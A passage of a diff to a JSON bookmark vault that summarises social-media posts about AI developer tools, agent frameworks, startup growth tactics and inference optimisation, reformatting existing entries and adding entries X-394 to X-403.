+    "topicTags": [
+      "ux",
+      "heuristics",
+      "design-systems",
+      "accessibility",
+      "agents"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2439,8 +3073,15 @@
     "engagement": "44 replies · 188 reposts · 2.9K likes · 5K bookmarks · 156.1K views",
     "essence": "Guilherme answers his own question about a video editing skill for Claude with ffmpeg-skill (kajisho5/ffmpeg-skill). Claude watches the video and edits it in high quality and fast, and he calls it the best he found for editing ready footage. In the thread he put several interview videos in a folder with the skill, described the result, and Claude joined them, added image effects, captions with correct timing and transitions. All edits are done by prompt. For simple edits with cuts, effects and captions it is enough; for motion graphics use Remotion, Brag or Hyperframe. Replies share alternatives such as SaneVideo, video-bitedit and heditor, and ask whether fine-tuning is possible or whether editing is prompt-only. See the related Opus video and levelsio entries.",
     "summary": "A practical skill for cuts, captions and transitions. For animated graphics, pair it with Remotion.",
-    "productLinks": ["https://github.com/kajisho5/ffmpeg-skill"],
-    "topicTags": ["ffmpeg", "video-editing", "claude-skills", "remotion"],
+    "productLinks": [
+      "https://github.com/kajisho5/ffmpeg-skill"
+    ],
+    "topicTags": [
+      "ffmpeg",
+      "video-editing",
+      "claude-skills",
+      "remotion"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2457,7 +3098,12 @@
     "essence": "Miracle lists 50 places to launch a startup. The top of the list: Hacker News, Reddit, Product Hunt, GeekNews (news.hada.io), whatlaunched.today, Indie Hackers, BetaList, Uneed, Peerlist and DevHunt. The rest are review sites (G2, Capterra, GetApp, TrustRadius), AI tool directories (Futurepedia, There's An AI For That, Toolify, FutureTools), and launch boards such as SideProjectors, Microlaunch, TinyLaunch and Wellfound. A self-reply sells directory submission for 100+ sites. In the thread he says the list is platforms where founders reported getting users, and results vary by product. Replies add trylaunch.ai and justhunt.co, and the top reply says the real step zero is customers.",
     "summary": "A broad launch checklist. Pick the few that match your audience instead of submitting everywhere.",
     "productLinks": [],
-    "topicTags": ["launch", "directories", "product-hunt", "indie-hackers"],
+    "topicTags": [
+      "launch",
+      "directories",
+      "product-hunt",
+      "indie-hackers"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2473,8 +3119,17 @@
     "engagement": "70 replies · 241 reposts · 3.6K likes · 8.3K bookmarks · 243.9K views",
     "essence": "Elliot says that if you edit video with Claude you can give it archive.org's free API (no key) and ask it to search the Prelinger and 78rpm collections for archival b-roll or period music. The collections include 10,000+ Prelinger films (public-domain stock footage), 187,000 78rpm records and 300,000+ live concert recordings. He suggests the clips suit artsy ads for tech. In replies, someone built an MCP for it (edigeh/broll-mcp), one user asks him to delete the post to avoid a tragedy of the commons, and others ask people to support the Internet Archive. A copyright caveat: footage can be public domain while a music recording can still get a Content ID claim.",
     "summary": "A free source of b-roll and old music for agent edits. Check each item's rights, and support the Archive.",
-    "productLinks": ["https://archive.org/developers/", "https://github.com/edigeh/broll-mcp"],
-    "topicTags": ["internet-archive", "b-roll", "video-editing", "public-domain", "api"],
+    "productLinks": [
+      "https://archive.org/developers/",
+      "https://github.com/edigeh/broll-mcp"
+    ],
+    "topicTags": [
+      "internet-archive",
+      "b-roll",
+      "video-editing",
+      "public-domain",
+      "api"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -2483,21 +3138,25 @@
     "platform": "Twitter",
     "category": "Dev Tools & Productivity",
     "subcategory": "Security audit skill",
-    "title": "Cloudflare security-audit skill finds bugs even with cheap models; Vercel reviews free until Nov 10",
+    "title": "Cloudflare security-audit skill finds bugs even with cheap models",
     "author": "Juraj Bednar🏴💛🌘",
     "date": "2026-10-21",
     "url": "https://x.com/jurbed/status/2112973191157252103",
     "engagement": "133 replies · 802 reposts · 8.7K likes · 16.2K bookmarks · 608.7K views",
-    "essence": "Juraj recommends Cloudflare's security-audit skill (cloudflare/security-audit-skill): run it on all your software, even after a model has audited it, and it works in any agent harness. He says it works with Opus 5.5, then corrects himself that it does not work with GPT models. With free Minimax M3.1 it found critical bugs that Opus, Fable and Astra missed. He ends a run by writing 'fix all, commit, push, deploy', and tells you to have the agent reproduce each finding to verify it. Replies warn about the cost and limits: it eats a lot of tokens, frontier models can stop halfway when they find a real vulnerability, and one user asks how false positives are handled across repos. A related reply, on bookmark X-384, from Guillermo Rauch says Vercel Security Reviews found 6,817 vulnerabilities in 24 hours (580 critical or high, 1,411 patched by an agent) and are 100% free until 10 Nov. See the earlier security-audit-skill entry.",
-    "summary": "Run it on your own repos with a cheap model, and verify each finding. The Vercel free window ends on 10 Nov 2026.",
-    "productLinks": ["https://github.com/cloudflare/security-audit-skill"],
-    "topicTags": ["security", "audit", "claude-skills", "cloudflare", "vercel"],
+    "essence": "Juraj recommends Cloudflare's security-audit skill (cloudflare/security-audit-skill): run it on all your software, even after a model has audited it, and it works in any agent harness. He says it works with Opus 5.5, then corrects himself that it does not work with GPT models. With free Minimax M3.1 it found critical bugs that Opus, Fable and Astra missed. He ends a run by writing 'fix all, commit, push, deploy', and tells you to have the agent reproduce each finding to verify it. Replies warn about the cost and limits: it eats a lot of tokens, frontier models can stop halfway when they find a real vulnerability, and one user asks how false positives are handled across repos. A related reply, on bookmark X-384, from Guillermo Rauch says Vercel Security Reviews found 6,817 vulnerabilities in 24 hours (580 critical or high, 1,411 patched by an agent) and were 100% free until 10 Nov. That free offer ended on 10 Nov 2026, so check Vercel's current price. See the earlier security-audit-skill entry.",
+    "summary": "Run it on your own repos with a cheap model, and verify each finding. The Vercel free window ended on 10 Nov 2026.",
+    "productLinks": [
+      "https://github.com/cloudflare/security-audit-skill"
+    ],
+    "topicTags": [
+      "security",
+      "audit",
+      "claude-skills",
+      "cloudflare",
+      "vercel"
+    ],
     "worthFollowUp": "high",
-    "hasMedia": "",
-    "important": {
-      "note": "Vercel Security Reviews are free until 10 Nov 2026 (from a reply on X-384). Run the Cloudflare security-audit skill on your repos too.",
-      "deadline": "2026-11-10"
-    }
+    "hasMedia": ""
   },
   {
     "uid": "X-384",
@@ -2509,10 +3168,18 @@
     "date": "2026-10-22",
     "url": "https://x.com/zahragr8r/status/2113188860121501711",
     "engagement": "20 replies · 39 reposts · 701 likes · 1.1K bookmarks · 51.7K views",
-    "essence": "Zahra shares an open-source task manager with a demo (gr8r-taskmanagement on Vercel) and the GitHub repo gr8rstudio/gr8r-studio, saying it already has 1,000+ stars and that Claude makes her team very fast. Three replies point out it is not fully open source without a license. Other replies in the thread are more useful than the post: Guillermo Rauch says Vercel Security Reviews found 6,817 vulnerabilities in 24 hours and are free until 10 Nov, and Matt Pocock's prompt of the day is 'How do we make this change fully verifiable?', which makes the agent verify its changes by signing up to real services and clicking through the frontend. Cloudflare's security-audit skill is also promoted in a reply.",
-    "summary": "The project itself is minor. Keep the 'fully verifiable' prompt and the Vercel free-review window (until 10 Nov).",
-    "productLinks": ["https://github.com/gr8rstudio/gr8r-studio/", "https://gr8r-taskmanagement.vercel.app/"],
-    "topicTags": ["open-source", "task-manager", "licensing", "verification-prompt"],
+    "essence": "Zahra shares an open-source task manager with a demo (gr8r-taskmanagement on Vercel) and the GitHub repo gr8rstudio/gr8r-studio, saying it already has 1,000+ stars and that Claude makes her team very fast. Three replies point out it is not fully open source without a license. Other replies in the thread are more useful than the post: Guillermo Rauch says Vercel Security Reviews found 6,817 vulnerabilities in 24 hours and were free until 10 Nov (that offer has ended), and Matt Pocock's prompt of the day is 'How do we make this change fully verifiable?', which makes the agent verify its changes by signing up to real services and clicking through the frontend. Cloudflare's security-audit skill is also promoted in a reply.",
+    "summary": "The project itself is minor. Keep the 'fully verifiable' prompt. The Vercel free-review window ended on 10 Nov 2026.",
+    "productLinks": [
+      "https://github.com/gr8rstudio/gr8r-studio/",
+      "https://gr8r-taskmanagement.vercel.app/"
+    ],
+    "topicTags": [
+      "open-source",
+      "task-manager",
+      "licensing",
+      "verification-prompt"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "video"
   },
@@ -2529,7 +3196,12 @@
     "essence": "Vivek argues that if you have 10 lakh in the bank you should not take a car loan. Keep the 10 lakh in an FD for 7 years at 6%, take a 9 lakh overdraft at 7%, and buy the car. His figures: FD maturity 15.17 lakh rupees, overdraft EMI 13,583 for 84 months, interest earned 5.17 lakh, interest paid 2.41 lakh, total gain 2.76 lakh. He says car loans carry higher rates and processing fees, while an overdraft costs about 1% more than the FD rate with no processing charge. The post quotes a debate on whether to take a loan when you can pay cash. Replies push back: you lose the liquidity that is the point of an FD, you pay interest on your own money while the FD interest is taxed, and many people lack the cash to cover EMIs. One reply says it only helps if you know the structure.",
     "summary": "An interesting structure with real trade-offs: liquidity, tax on FD interest and a modest gain. Check the numbers with your own bank.",
     "productLinks": [],
-    "topicTags": ["fd", "overdraft", "car-loan", "india-finance"],
+    "topicTags": [
+      "fd",
+      "overdraft",
+      "car-loan",
+      "india-finance"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -2545,8 +3217,15 @@
     "engagement": "19 replies · 53 reposts · 1.7K likes · 3.4K bookmarks · 167K views",
     "essence": "Details posts one line, 'give claude better taste', with the link details.so/mcp. It is a design MCP for coding agents; the post has no more detail. In the thread the team asks a user which OS and browser they use after a bug report. Replies say impeccable.style does a similar job without a price tag, ask how the MCP passes motion references such as timing and easing that a screenshot cannot capture, and suggest that you can also save a page and hand it to Claude. Unrelated promoted replies fill the rest of the thread.",
     "summary": "Compare with impeccable and TasteSkill before you pay for another design layer.",
-    "productLinks": ["https://details.so/mcp"],
-    "topicTags": ["mcp", "design-taste", "frontend", "claude"],
+    "productLinks": [
+      "https://details.so/mcp"
+    ],
+    "topicTags": [
+      "mcp",
+      "design-taste",
+      "frontend",
+      "claude"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -2562,8 +3241,16 @@
     "engagement": "3 replies · 1 reposts · 82 likes · 177 bookmarks · 7.9K views",
     "essence": "Taras says another visibility hack for a SaaS is to create a CLI, because npm directories such as Libraries.io (DR 75) pick it up automatically. Step 1: have a public API. Step 2: wrap it in a small CLI with a login command that takes an API key and one command per main action (ask Claude to write it). Step 3: fill in name, description, keywords, homepage and repository in package.json. Step 4: run npm publish --access public. It is then picked up by npm.io, Libraries.io, jsDelivr, Google's deps.dev and others, and some customers prefer a CLI to an API or MCP. Replies agree and add MCP servers as another listing route. In the replies, an Ahrefs account says it is releasing a preview of DR4, a new Domain Rating model, and DR may change when it rolls out on 1 Dec, with subdomains getting their own rating. This matters because every hack in this series quotes DR numbers. Another reply argues that in 2026 you should start an AI-enhanced productized service, not a SaaS.",
     "summary": "A small CLI is cheap distribution. The DR scores quoted across the series may shift after Ahrefs rolls out DR4 on 1 Dec 2026.",
-    "productLinks": ["https://libraries.io/"],
-    "topicTags": ["cli", "npm", "backlinks", "ahrefs", "dr4"],
+    "productLinks": [
+      "https://libraries.io/"
+    ],
+    "topicTags": [
+      "cli",
+      "npm",
+      "backlinks",
+      "ahrefs",
+      "dr4"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image",
     "important": {
@@ -2583,8 +3270,16 @@
     "engagement": "40 replies · 77 reposts · 992 likes · 1.8K bookmarks · 160K views",
     "essence": "Cloudflare says the cost per run of its AI code reviewer doubled, so the team dug into token usage to find out why. Prompt caching and intelligent model routing cut the inference bill by 68% and sped up reviews. The post links a Cloudflare blog article about being obsessive about inference optimization. Replies add that tokens per review tripled and cost still fell, which shows cheaper models can do the job, and that another large saving may come from code mode or an equivalent. This is an unusually concrete cost write-up from a production system, close to the vault's inference-engineering plan.",
     "summary": "A real production case for prompt caching and routing as cost levers. Read the full blog post for the method.",
-    "productLinks": ["https://blog.cloudflare.com/obsessive-inference-optimization/"],
-    "topicTags": ["inference", "prompt-caching", "model-routing", "cost", "cloudflare"],
+    "productLinks": [
+      "https://blog.cloudflare.com/obsessive-inference-optimization/"
+    ],
+    "topicTags": [
+      "inference",
+      "prompt-caching",
+      "model-routing",
+      "cost",
+      "cloudflare"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -2600,8 +3295,20 @@
     "engagement": "144 replies · 1.2K reposts · 9.2K likes · 24.5K bookmarks · 834.8K views",
     "essence": "Kin lists eight repos for video work with Opus 5.5. 1) awesome-opus5-5-videos (about 7,100 stars): viral videos with their prompts. 2) lemo-opuscar (about 4,400): a Claude Code skill with 51 code short-film styles. 3) pdoom-video (about 3,000): a lyrics karaoke music video that renders 4K60 locally. 4) PDoomVideo (about 2,300): source for another video of the same song, to compare with 3. 5) mg-styles-15 (about 1,400): 15 motion-graphics styles with clips, prompts and code. 6) ClaudeAnimationBase (about 1,300): a starter pack for hand-drawn character animation with 31 expressions. 7) awesome-claude-5-5-videos (about 560): video workflows, 301 of them Opus-specific. 8) opus-video-prompts (about 510): Chinese-language cases with copy-paste prompts. Replies add pdoom.video (993 films and 501 prompts) and advise copying prompts to a local file, because repos can be renamed or change. The post has 24K bookmarks against 9K likes.",
     "summary": "A ready map of the Opus video ecosystem. Start with the prompt collections, and keep local copies.",
-    "productLinks": ["https://github.com/yihui-dev/awesome-opus5-5-videos", "https://github.com/lemomo-ai/lemo-opuscar", "https://github.com/Vincentwei1021/mg-styles-15", "https://github.com/athemeroy/awesome-claude-5-5-videos", "https://github.com/joeseesun/opus-video-prompts"],
-    "topicTags": ["opus-5-5", "video-generation", "claude-code", "motion-graphics", "awesome-list"],
+    "productLinks": [
+      "https://github.com/yihui-dev/awesome-opus5-5-videos",
+      "https://github.com/lemomo-ai/lemo-opuscar",
+      "https://github.com/Vincentwei1021/mg-styles-15",
+      "https://github.com/athemeroy/awesome-claude-5-5-videos",
+      "https://github.com/joeseesun/opus-video-prompts"
+    ],
+    "topicTags": [
+      "opus-5-5",
+      "video-generation",
+      "claude-code",
+      "motion-graphics",
+      "awesome-list"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2617,8 +3324,15 @@
     "engagement": "48 replies · 67 reposts · 1.5K likes · 1.6K bookmarks · 57.6K views",
     "essence": "Leon releases TasteSkill v2.1, installed with npx skills add Leonxlnx/taste-skill. It now supports dashboards and app screens. Landing pages for software show real, working parts of the app and not fake mockups. A new frame check looks for a missing title on the first screen, uneven margins, random alignment and empty gaps. There are also new motion recipes and more layouts, and one skill now covers everything including redesigns, with the old styles moved to taste-skill-classics and the image skills to imagegen-skills. The launch video was made with Opus 5.5. He says v2.2 is in work and that full app design is not supported yet. Replies praise the fast shipping (v2 was one week earlier). See the earlier TasteSkill v2 entry.",
     "summary": "A quick follow-up release. Update if you already use TasteSkill, and test the new frame check on a dashboard.",
-    "productLinks": ["https://github.com/Leonxlnx/taste-skill"],
-    "topicTags": ["taste-skill", "ui", "dashboards", "claude-skills"],
+    "productLinks": [
+      "https://github.com/Leonxlnx/taste-skill"
+    ],
+    "topicTags": [
+      "taste-skill",
+      "ui",
+      "dashboards",
+      "claude-skills"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -2634,8 +3348,16 @@
     "engagement": "13 replies · 19 reposts · 223 likes · 339 bookmarks · 17.2K views",
     "essence": "Priya says her agent warms up a US-based TikTok account every day, and she can turn the whole process into a cron job with one command to the agent. In the thread she says the workflow runs on Mobilerun, a cloud phone service (mobilerun.ai), that it can also run on a real device, and that her 4-month-old account still works because good infrastructure keeps TikTok from detecting it. Replies are doubtful: one says TikTok is very good at spotting bots and will shadow-ban the profile, and another asks whether it will trigger bot checks. Automated engagement can also break the platform's rules.",
     "summary": "An example of agents driving a phone on a schedule. The account-warming use is risky and may violate platform terms.",
-    "productLinks": ["https://mobilerun.ai/"],
-    "topicTags": ["agents", "cloud-phone", "tiktok", "cron", "automation"],
+    "productLinks": [
+      "https://mobilerun.ai/"
+    ],
+    "topicTags": [
+      "agents",
+      "cloud-phone",
+      "tiktok",
+      "cron",
+      "automation"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "video"
   },
@@ -2651,8 +3373,15 @@
     "engagement": "7 replies · 12 reposts · 147 likes · 161 bookmarks · 14.1K views",
     "essence": "Hayden announces a free cloud workspace for every mobile developer from Revyl: cloud builds, iOS and Android simulators, app maps and proof on every PR. In the thread you can start free at revyl.com, and if you need a thousand devices you can get them, but not for free. Replies note the free tier is only 20 concurrent devices and ask whether it is a dual-platform simulator service and whether remote control of simulators works for local development. Revyl later adds web support, with a full replay, every step, logs, network and performance on one timeline, and the company confirms in replies that web is live.",
     "summary": "A free trial for cloud simulators and PR proof. Check the 20-device limit and whether it fits your build flow.",
-    "productLinks": ["https://revyl.com/"],
-    "topicTags": ["mobile-dev", "simulators", "cloud-devices", "ci"],
+    "productLinks": [
+      "https://revyl.com/"
+    ],
+    "topicTags": [
+      "mobile-dev",
+      "simulators",
+      "cloud-devices",
+      "ci"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -2669,8 +3398,995 @@
     "essence": "Grant shares a list of 724 mostly free backlink opportunities and asks for a like or repost if it helps. The post has no body text; the content is a long list of sites. It covers general and AI-tool directories, startup and business listings, guest-post and write-for-us sites, tech and startup media, community and forum sites, and profile sites such as GitHub, GitLab, Dribbble, Behance and Stack Overflow. Eight replies were not captured as useful text. As with the other backlink lists, many entries will be paid, dead or nofollow.",
     "summary": "Raw material for a backlink sheet. Filter out dead and paid sites before you submit.",
     "productLinks": [],
-    "topicTags": ["backlinks", "directories", "guest-posts", "seo"],
+    "topicTags": [
+      "backlinks",
+      "directories",
+      "guest-posts",
+      "seo"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "image"
+  },
+  {
+    "uid": "X-394",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Formal verification for agents",
+    "title": "everystate: a Rust TLA+ model checker so agents can find race conditions without Java",
+    "author": "Matt Carey",
+    "date": "2026-11-17",
+    "url": "https://x.com/mattzcarey/status/2122815603841040517",
+    "engagement": "24 replies · 24 reposts · 370 likes · 442 bookmarks · 15K views",
+    "essence": "Matt Carey releases everystate, an experimental TLA+ model checker written in Rust for coding agents. It aims for full TLC compatibility and needs no Java, which earlier TLA+ tools required. He says it proves that an agent did what you expected, and you can use it from the CLI or from code. He builds the states from code and English descriptions. Follow-up posts say it is quicker than the Java engine on all his examples, with a faster 0.4.0 to come. A second bookmarked post gives the prompt to use: tell your agent to use the repo's formal verification skill to find race conditions. Replies point to Feynman (feynman.leostera.dev), which implements most of TLA and an integer core checker. Others ask for performance numbers and why he did not use Quint.",
+    "summary": "Try it on code with sync or concurrency logic. The tool is experimental, so treat a pass as a strong hint and not as proof.",
+    "productLinks": [
+      "https://github.com/mattzcarey/everystate",
+      "https://feynman.leostera.dev/",
+      "https://x.com/mattzcarey/status/2122821279107428487"
+    ],
+    "topicTags": [
+      "tla-plus",
+      "formal-verification",
+      "rust",
+      "model-checking",
+      "agents"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "image",
+    "relatedUrls": [
+      "https://x.com/mattzcarey/status/2122821279107428487"
+    ]
+  },
+  {
+    "uid": "X-395",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent test hygiene",
+    "title": "Landmines: Oxlint rules that ban lazy AI-written tests and slop structure",
+    "author": "Luke Shiels",
+    "date": "2026-11-17",
+    "url": "https://x.com/lukeshiels/status/2122782710414336458",
+    "engagement": "13 replies · 38 reposts · 947 likes · 1.7K bookmarks · 56K views",
+    "essence": "Luke Shiels open-sources Landmines, a set of Oxlint plugins from Interfere. He says AI mostly writes useless tests and no skill file stops it from taking the lazy path to a green CI. The test rules ban mocks and artificial delays and require MSW for network interception, so you use the real Stripe SDK and not a fake copy. The structure rules require tests next to the code, a semantic suffix for test files, and no global export conditions, which he says speeds up tests a lot. His team went from about 100 PRs a week to over 1,200 a week after the rollout. This number is his own claim. More ban categories are in testing. In a reply he says custom rules work because Oxlint supports that natively.",
+    "summary": "A practical way to enforce test quality with lint rules instead of prose. Treat the 12x PR growth as the author's claim.",
+    "productLinks": [
+      "https://github.com/interfere-inc/landmines"
+    ],
+    "topicTags": [
+      "oxlint",
+      "linting",
+      "ai-tests",
+      "msw",
+      "agents"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-396",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent frameworks",
+    "title": "eve 1.0 is generally available: open-source framework for production agents",
+    "author": "eve",
+    "date": "2026-11-17",
+    "url": "https://x.com/eve/status/2122757457101681075",
+    "engagement": "15 replies · 104 reposts · 676 likes · 510 bookmarks · 93.3K views",
+    "essence": "The eve account announces eve 1.0, now generally available. You build agents on your own harness, ship multi-tenant and multiplayer agents, govern and trace sessions with Agent Runs, and render agent UIs with Next.js, Nuxt and other frameworks. The linked Vercel blog post says eve is open source, saves progress through the Workflow SDK so an agent resumes after a crash, and has native channels such as Slack, Teams, Discord and GitHub. Managed hosting runs on Vercel Workflows and Vercel Sandbox. Replies are mostly congratulations. One asks whether Agent Runs tracing costs extra, and the captured replies give no answer.",
+    "summary": "Read the blog post before you pick eve over your own agent loop. Check the price of Agent Runs tracing first.",
+    "productLinks": [
+      "https://vercel.com/blog/eve-is-now-generally-available"
+    ],
+    "topicTags": [
+      "eve",
+      "vercel",
+      "agents",
+      "framework",
+      "multiplayer"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-397",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "CLAUDE.md prompts",
+    "title": "Prompt turns 60 days of agent mistakes into lint rules, tests and types",
+    "author": "Limestone Digital",
+    "date": "2026-11-17",
+    "url": "https://x.com/LimestoneHQ/status/2122729186083381459",
+    "engagement": "2 replies · 23 likes · 89 bookmarks · 8.1K views",
+    "essence": "Limestone Digital shares a Claude Code prompt that audits your agent's repeat mistakes. It finds agent-authored PRs from the last 60 days (AI co-author trailer, bot author, AI label or a 'Generated with Claude Code' line). It then reads their review comments, reverts, CI failures and fix PRs within 14 days, plus the lines added to CLAUDE.md or AGENTS.md. It groups mistakes seen at least twice. For each group it picks the strongest fix. The order is a type or schema, a lint rule or CI check, a test the agent must run before it says done, a scoped rule with a reason, and last, human review. A fresh subagent acts as judge and re-opens every cited PR. The prompt ends with a table and diffs, then waits for your approval. The thread says long CLAUDE.md files reduce adherence. Run it with claude --permission-mode plan and the GitHub CLI signed in, and approve only the diffs you agree with. The last posts are ads for the firm's services.",
+    "summary": "A reusable audit prompt that makes CLAUDE.md shorter. Read the commands it runs, because it reads PRs through the gh CLI.",
+    "productLinks": [
+      "https://thefoundation.limestonedigital.com/ai-transformation-operations"
+    ],
+    "topicTags": [
+      "claude-md",
+      "prompts",
+      "lint-rules",
+      "ci",
+      "agent-mistakes"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-398",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent computer use",
+    "title": "Daytona adds macOS sandboxes for agents (M4, M4 Pro, M5 Pro)",
+    "author": "Ivan Burazin",
+    "date": "2026-11-17",
+    "url": "https://x.com/ivanburazin/status/2122721729512628713",
+    "engagement": "110 replies · 110 reposts · 725 likes · 596 bookmarks · 130.5K views",
+    "essence": "Ivan Burazin announces that macOS Sandboxes are live on Daytona, on M4, M4 Pro and M5 Pro hardware, with the tagline that agents can finally use a Mac. His thread admits that bare metal is the cheapest way to get a Mac, but says you then do the setup, isolation, imaging and scaling yourself. He says Daytona does not compete on price. You get the whole Mac, and more is coming. Replies point to a bare-metal host that charges about 10 euros a day (macduty.com). One asks whether agents can run the iOS Simulator in these sandboxes, and the captured replies give no answer. Another asks whether these are VMs or full Macs.",
+    "summary": "Useful when an agent needs Xcode, the iOS Simulator or macOS UI. Compare the price with a bare-metal host first.",
+    "productLinks": [
+      "https://app.daytona.com/",
+      "https://macduty.com/"
+    ],
+    "topicTags": [
+      "daytona",
+      "macos",
+      "sandbox",
+      "agents",
+      "ios-simulator"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-399",
+    "platform": "Twitter",
+    "category": "Startups, Product & Marketing",
+    "subcategory": "Founder lessons",
+    "title": "Pieter Levels: let people mess around, because that play turned into millions",
+    "author": "@levelsio",
+    "date": "2026-11-17",
+    "url": "https://x.com/levelsio/status/2122724654989332634",
+    "engagement": "44 replies · 61 reposts · 1.3K likes · 479 bookmarks · 114K views",
+    "essence": "Pieter Levels tells how a pointless game on his couch in February 2025 led to big results. He tried a Mario Kart clone with Claude, then built a flight simulator. Claude 3.7 Sonnet made it work, thousands of people flew it in multiplayer, sponsors paid for in-game blimps, and it made $85,000 in a month and $200,000 in total. A Cursor founder wrote to him by DM for feedback, and he invested in Cursor. He then ran Vibe Jam, a vibe-coded game contest with 1,000+ makers and over 1 million players, and says Cursor was later acquired by SpaceX. His point is to let people mess around and see where it goes. A quoted post tells readers to explain this to partners. A reply says the Vibe Jam site is online at vibejam.com/2025.",
+    "summary": "A founder story with claims we cannot check. The useful idea is that unplanned play can be the research.",
+    "productLinks": [
+      "https://vibejam.com/2025/"
+    ],
+    "topicTags": [
+      "levelsio",
+      "vibe-coding",
+      "games",
+      "indie-hacking",
+      "founder-story"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-400",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Inference optimisation",
+    "title": "0xSero says an open-source inference-optimisation skill made him over $100K",
+    "author": "0xSero",
+    "date": "2026-11-17",
+    "url": "https://x.com/0xSero/status/2122484978730852641",
+    "engagement": "73 replies · 155 reposts · 2.7K likes · 4.7K bookmarks · 145.8K views",
+    "essence": "0xSero says he made at least $100,000 with an inference-optimisation skill and open-sources it (sybil-solutions/inference-optimisation-skill). His thread says the skill works, and advises you to offer inference tuning as a service on whatever machines people have, then open-source the result and post about it. A third post links local-ai-registry, a registry with one validated recipe per machine. Replies say it helped a laptop. One asks how it compares with human optimisation. Another asks for his DeepSeek V4.1 Flash SGLang settings on 4x H200, because the reader is stuck at 189 tokens per second at concurrency 1.",
+    "summary": "Close to the vault's inference-engineering plan. The $100K claim is unproven. The repo and the registry are the useful parts.",
+    "productLinks": [
+      "https://github.com/sybil-solutions/inference-optimisation-skill",
+      "https://github.com/sybil-solutions/local-ai-registry"
+    ],
+    "topicTags": [
+      "inference",
+      "optimisation",
+      "sglang",
+      "local-ai",
+      "skills"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-401",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Computer-use efficiency",
+    "title": "Orion: gaze-prediction model claims 31% faster computer use and 2x more UX bugs found",
+    "author": "Ryan Lin",
+    "date": "2026-11-16",
+    "url": "https://x.com/_ryanlin10/status/2122374141131002087",
+    "engagement": "61 replies · 123 reposts · 2.2K likes · 2.1K bookmarks · 75.5K views",
+    "essence": "Ryan Lin introduces Orion, a foundation model that predicts where a person looks. It trains on real eye-tracking data, 20x more than earlier saliency models. His thread gives these claims: it finds twice as many UX bugs as frontier models when you connect PostHog session replays at app.paradigmmachines.ai. It cuts computer-use model call time by 31% and image tokens by 66% by magnifying the predicted gaze area and shrinking the rest, with no measurable loss in task success. It triples decision rate in a VLM drone control task, which finished a drone race. It also helps auto-zoom in launch videos and flags dashcam hazards. It cuts computer-use prompt-injection attacks by 96% by flagging messages in areas with low predicted gaze. An API doc page exists. Replies ask whether the model can run without session-replay data.",
+    "summary": "Interesting for cutting screenshot tokens in computer-use agents. All figures come from the authors, so test on your own tasks.",
+    "productLinks": [
+      "https://app.paradigmmachines.ai/",
+      "https://app.paradigmmachines.ai/docs/api"
+    ],
+    "topicTags": [
+      "gaze",
+      "computer-use",
+      "vlm",
+      "ux-bugs",
+      "prompt-injection"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-402",
+    "platform": "Twitter",
+    "category": "Startups, Product & Marketing",
+    "subcategory": "Social growth maths",
+    "title": "The 32 TikTok accounts maths: 4 phones to $438K a year, but the inputs are guesses",
+    "author": "Chad",
+    "date": "2026-11-16",
+    "url": "https://x.com/ChadAppDev/status/2122365801445396794",
+    "engagement": "80 replies · 44 reposts · 713 likes · 1.1K bookmarks · 97.1K views",
+    "essence": "Chad lays out funnel maths: 4 phones run 32 TikTok accounts, which post 3 times a day, or 96 posts. At 1,000 views each that is 96,000 views a day. At 5 downloads per 1,000 views that is 480 downloads. At a 5% pay rate that is 24 paying users, and at $50 a year that is $1,200 a day or $438,000 a year before renewals. In his thread he says he is testing posting straight to live, starting with drafts, and uses the Ampli scheduler. Replies warn that one shadowban can hit every account on the same phone. Others ask how he passes phone verification for 8 accounts per phone, and one reader got 0 downloads from 3,000 views. See X-391.",
+    "summary": "Every rate in the chain is an assumption, not a result. Platform rules on multiple accounts apply.",
+    "productLinks": [],
+    "topicTags": [
+      "tiktok",
+      "growth",
+      "funnel-maths",
+      "mobile-apps",
+      "multi-account"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-403",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent instructions",
+    "title": "AGENTS.md rule: agents must start dev servers from their own shell so they end with the session",
+    "author": "Dave Kiss",
+    "date": "2026-11-16",
+    "url": "https://x.com/davekiss/status/2122345604252618919",
+    "engagement": "4 replies · 41 likes · 44 bookmarks · 3.7K views",
